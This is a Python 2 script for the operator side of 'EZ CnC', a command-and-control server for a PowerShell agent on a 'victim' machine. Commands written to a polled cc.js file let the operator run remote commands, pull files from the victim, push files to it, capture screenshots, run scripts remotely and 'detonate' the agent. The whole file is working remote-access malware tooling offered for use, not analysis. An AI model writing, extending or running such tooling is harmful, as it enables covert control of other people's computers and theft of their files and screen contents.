#!/usr/bin/python 

#########
## Version 0.3.1 of the EZ CnC
##
## COMPLETE: HTTPS
## COMPLETE: Screenshots 
## COMPLETE: COmmands via GET
## COMPLETE: Uploads to victim
## COMPLETE: Downloads from victim
## COMPLETE: Sleep Variable
## COMPLETE: Generate victim.ps1 on fly (config.sh .. to config.py)
## COMPLETE: Add custom Port when starting commandServer.py
## COMPLETE: Server IP 
## COMPLETE: Add Logging capabilities of output
## TODO: Add Better Logging capabilities (only does GET commands currently)
## COMPLETE: Global Variables
## COMPLETE: How to run script
## COMPLETE: Require -p 8080 port
## COMPLETE: Argument precheck
## COMPLETE: Argument While Loop
## COMPLETE: Start eguiHTTPS.py and server.py
## COMPLETE: Cat the Banner.txt
## COMPLETE: Print Help functionality
## COMPLETE: Keyboard while loop (wait for key press)
## COMPLETE: Main While Loop
## COMPLETE: Cleanup Script
## TODO: Have a 'snapshot'.. where it enumerates the host and sends it back 
## TODO: Performs searches ?
## TODO: Run custom scripts from ./Scripts/
## TODO: Better user input functions.. if/else not sustainable
## COMPLETE: Add Local Command capability


######
# IMPORT
######
import sys
import argparse
import time
import os
import subprocess
import psutil
import base64
import shutil

######
## GLOBAL VARIABLES
######
SLEEP=(5)
pwd = os.getcwd()
cc=(pwd + '/WebOnly/cc.js')
eguiHTTPS=(pwd + '/ServerRequirements/eguiHTTPS.py')
server=(pwd + '/ServerRequirements/server.py')


#########
## COLOR VARIABLES
colorGreen = "\033[1;32;40m"
colorBlack = "\033[0;37;40m"
colorRed = "\033[1;31;40m"
colorYellow = "\033[1;33;40m"
colorBlue = "\033[1;34;40m"
"""
1 = *
2 = +
3 = !
4 = -
"""
green1 = "\033[1;32;40m[*]\033[0;37;40m"
green2 = "\033[1;32;40m[+]\033[0;37;40m"
green3 = "\033[1;32;40m[!]\033[0;37;40m"
green4= "\033[1;32;40m[-]\033[0;37;40m"
yellow1 = "\033[1;33;40m[*]\033[0;37;40m"
yellow2 = "\033[1;33;40m[+]\033[0;37;40m"
yellow3 = "\033[1;33;40m[!]\033[0;37;40m"
yellow4 = "\033[1;33;40m[-]\033[0;37;40m"
red1 = "\033[1;31;40m[*]\033[0;37;40m"
red2 = "\033[1;31;40m[+]\033[0;37;40m"
red3 = "\033[1;31;40m[!]\033[0;37;40m"
red4 = "\033[1;31;40m[-]\033[0;37;40m"
## END COLOR VARIABLES
###########



#######
## Define Functions
#######
def bannerFunc():
    # BANNER COMPLETE
    f = open('BANNER.txt', 'r').read()
    print(f)

def cleanupFunc():
    print(green3 + " Cleaning up..")
    processes = {'eguiHTTPS.py', 'server.py'}
    for proc in psutil.process_iter():
        # check whether the process name matches
        if proc.name() in processes:
            proc.kill()
    time.sleep(2)
    print(green3 + " Server successfully shutdown, Goodbye!")

def keyboardFunc():
    raw_input(green3 + " Press Enter to continue...")

def howToFunc():
    # MAYBE
    print(colorGreen + "[*] -------------------------------------- [*]" + colorBlack)
    print(green1 + " Type " \
            + colorBlue + "1" + colorBlack + " to run a command")
    print(green1 + " Type " \
            + colorBlue + "2" + colorBlack + " to download a file from victim")
    print(green1 + " Type " \
            + colorBlue + "3" + colorBlack + " to upload a file to victim")
    print(green1 + " Type " \
            + colorBlue + "4" + colorBlack + " to take a screenshot")
    print(green1 + " Type " \
            + colorBlue + "5" + colorBlack + " to run a script")
    print(green1 + " Type " \
            + colorBlue + "shell" + colorBlack + " to run a local shell command")
    print(green1 + " Type " \
            + colorBlue + "panic" + colorBlack + " to detonate remote agent")
    print(green1 + " Type " \
            + colorBlue + "q" + colorBlack + " or " \
            + colorBlue + "Q" + colorBlack + " to shutdown")

def mainLoopFunc():
    # Main Loop

    #print('MAIN LOOP')
    while True:
        howToFunc()
        user_input = str(raw_input(yellow1 + \
                " Type " + colorBlue + "1" + colorBlack + \
                ", " + colorBlue + "2" + colorBlack + \
                ", " + colorBlue + "3" + colorBlack + \
                ", " + colorBlue + "4" + colorBlack + \
                ", " + colorBlue + "5" + colorBlack + \
                ", " + colorBlue + "shell" + colorBlack + \
                ", " + colorBlue + "panic" + colorBlack + \
                ", or " + colorBlue + "q" + colorBlack + \
                "/" + colorBlue + "Q" + colorBlack + "\n"))
        #print(user_input)

        ###################
        ## 1 - COMMAND
        ###################
        if user_input is '1':
            #print("COMMAND!")
            command_input = raw_input(yellow1 + " What command do you want to run?\n")
            #print("Command is " + command_input)

            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()
            
            # Sleep a moment to refresh stuff
            time.sleep(SLEEP)
            continue

        ###################
        ## 2 - DOWNLOAD FROM VICTIM
        ###################
        elif user_input is '2':
            #print(green3 + "DOWNLOAD FROM VICTIM")
            command_input = raw_input(yellow1 + " What file do you want to Download from Victim?\n")
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()

            print(yellow1 + " Waiting for results..")
            time.sleep(SLEEP)
            time.sleep(SLEEP)
            
            # Change name from FILENAME (created in eguiHTTPS.py) to real Filename
            os.rename('./WebOnly/FILENAME', './Files/' + command_input)
            time.sleep(2)
            print(green3 + " " + command_input + " has been downloaded and saved to " + pwd + '/Files/' + command_input)
 
            continue

        #####################
        ## 3 - UPLOAD TO VICTIM
        #####################
        elif user_input is '3':
            #print("UPLOAD TO VICTIM")
            command_input = raw_input(yellow2 + " What file do you want to Upload to Victim?\n")
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(command_input + '\n')
            f.close()

            # Copy file you want to upload (located in ./Files/) to ./WebOnly/
            shutil.copy('./Files/' + command_input, './WebOnly/')

            print(yellow1 + " Uploading file to Victim...")
            time.sleep(SLEEP)
            print(yellow1 + " Let's make sure it's there..")

            # Validate it's there by running "dir <file>" on victim
            f = open (cc, 'w')
            f.write("1\n")
            f.write("dir " + command_input)
            f.close()

            # Sleep to make sure
            time.sleep(SLEEP)
            time.sleep(SLEEP)

            # Remove the file we temporarily moved to ./WebOnly
            os.remove('./WebOnly/' + command_input)
    
            continue

        #########################
        ## 4 - SCREEN CAPTURE
        #########################
        elif user_input is '4':
            #print("SCREENCAPTURE")
            # Blank out cc.js
            f = open (cc, 'w')
            f.write("")
            f.close()
            time.sleep(SLEEP)
            time.sleep(SLEEP)
            # Write command to cc
            f = open (cc, 'w')
            f.write(user_input + '\n')
            f.write(user_input + '\n')
            f.close()

            print(yellow1 + " Performing Screen Capture...")
            time.sleep(3)
            print(green3 + " Screen Capture Complete!")
            time.sleep(1)
            print(yellow1 + " Grabbing Screen Capture...")
            time.sleep(3)

            # Make Date File for Screenshot name
            dateFile = ("screenshot-" + time.strftime("%Y%m%d-%H%M%S") + ".bmp")
            
            time.sleep(SLEEP)
            # Read downloaded Screenshot1.bmp (which is base64 encoded) and decode it into a file with dateFile .. save it to Screenshots directory
            f = open('./WebOnly/screenshot1.bmp', 'r').read()
            decoded = base64.b64decode(f)
            g = open('./Screenshots/' + dateFile, 'w')
            g.write(decoded)
            g.close()
            
            # Remove screenshot uploaded.. since it is renamed in ./Screenshots/ directory
            os.remove('./WebOnly/screenshot1.bmp')
            time.sleep(SLEEP)

            continue
        
        ###########
        ## 'shell' - For local shell command
        ###########
        elif user_input == 'shell':
            # Get input from user and use os.system to run the command
            command = raw_input(yellow2 + ' What local command do you want to run?\n')
            output = os.popen(command).read() # Read raw_input, execute and save to variable
            
            #output = os.system(command)
            print(colorGreen + str(output) + colorBlack)

            #time.sleep(2)

            continue

        ############
        ## 'panic' - This will detonate the agent
        ############
        elif user_input == 'panic':
            command = raw_input(red2 + " You have requested to detonate the agent. Are you sure? 'yes' or 'no'\n")
            if command == 'yes':
                command2 = raw_input(red3 + " To make sure you really want this, type 'yes' again\n")
                if command2 == 'yes':
                    # SEND THE RM ./EZ-AGENT.ps1' command
                    print(red4 + " Executing detonation! BOOM!!")
                    continue # break command2 if
                else:
                    print(red1 + " Good call! Not today..")
                    continue # break command2 else
            else:
                print(red1 + " Good call! Not today..")
                continue # break for "if yes"
            continue # Continue for elif
        
        ############
        ## RUN SCRIPTS
        ############
        elif user_input is '5':
            # From ListScripts function
            scripts = os.listdir('./Scripts/')
            totalScripts = (len(scripts))

            #print("Below are the items")
            for list in scripts:
                print(yellow2 + " Choose: " + str(scripts.index(list)+1) + " for " + list)

            #print("There are a total of " + str(totalScripts))
            
            while True:
                try:
                    user_input2 = int(raw_input(yellow2 + " Choose the Script # or '0' to quit\n"))
                except ValueError:
                    print("[-] That's not a number!")
                else:
                    if 1 <= user_input2 <= int(totalScripts):

                        second_input = str(raw_input(yellow3 + " Are you sure?? 'yes' or 'no'\n"))
                        if second_input == 'no':
                            print(red1 + " Good catch, leaving..")
                            break
                        elif second_input == 'yes':
                            #print("Good job!")
                            #print("TODO: STILL WORKING ON THIS")
                            #The below works
                            new = (int(user_input2) -1)
                            choice = str(scripts[new])
                            print(yellow1 + " You chose script: " + choice)
                            #print("Let's move that to ./WebOnly/")
                            shutil.copy('./Scripts/' + choice, './WebOnly/' + choice)
                            #print("File is now in ./WebOnly/")
                            
                            # Write command to cc
                            f = open (cc, 'w')
                            f.write(str(user_input) + '\n')
                            f.write(str(choice) + '\n')
                            f.close()
                            
                            # SCRIPT IS NOW DEPLOYED.. 30 sec minimum wait
                            print(yellow1 + " Script has been deployed...")
                            # Just wait a bit
                            time.sleep(5)
                            print(yellow1 + " Script is now running on victim...")
                            time.sleep(5)
                            #print("[!] Script is being processed...")
                            time.sleep(10)
                            print(yellow1 + " Output it being uploaded...")
                            
                            # Update cc.js with 'download from victim' command..
                            f = open(cc,'w')
                            f.write('2\n')
                            f.write('ScriptOutput.txt\n')
                            f.close()
                            
                            time.sleep(10)
                            print(yellow1 + " Waiting for results...")
                            time.sleep(10)


                            # Rename file to script name with timestamp
                            os.rename('./WebOnly/FILENAME', './Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")
                            time.sleep(2)
                            
                            # Print completion
                            print(green1 + ' ' + choice + " has been completed and results have been saved to:\n " + pwd + '/Files/' + choice[:-4] + time.strftime("%Y%m%d-%H%M%S") + ".txt")                        

                            break

                        else:
                            print(yellow3 + " Choose 'yes' or 'no'")
                            continue
                    elif user_input == 0:
                        print(red4 + " Okay we leave, goodbye")
                        break
                    else:
                        print(red4 + " Out of Range, try again!")
                        continue
                
        ####
        ## Q TO QUIT
        ####
        elif user_input is 'q':
            #print("QUIT")
            break
        ####
        ## Q TO QUIT
        ####
        elif user_input is 'Q':
            #print("QUIT")
            break
        ####
        ## START OVER
        ####
        else:
            print(red4 + " Invalid command.. let's start over")
            continue

def main():
    # ARG PARSER BELOW
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', type=int, default='8000', metavar='<Port Number>',
        required=True,
        help="Provide a port the server will listen on")
    args = parser.parse_args()
    port = sys.argv[2]
    #print('Your port is ' + port) # Not needed

    # Run eguiHTTPS: Use the port established from arguments, save web logs to ./ServerRequirements/log.txt
    # Run server.py: Checks log.txt and does base64 decode of the results
    subprocess.Popen(['./ServerRequirements/eguiHTTPS.py', port], shell=False) 
    subprocess.Popen(['./ServerRequirements/server.py'], shell=False)

    # Clear cc.js
    f = open(cc, 'w')
    f.write('')
    f.close()

if __name__ == "__main__":
    main()
    
    # Sleep as things get in place
    time.sleep(5)

    # Print the Banner
    bannerFunc()

    time.sleep(2)

    # Run the Keyboard Function
    keyboardFunc()

    time.sleep(2)
    
    # Main Loop Function
    mainLoopFunc()
    
    # Run the cleanup Function
    cleanupFunc()
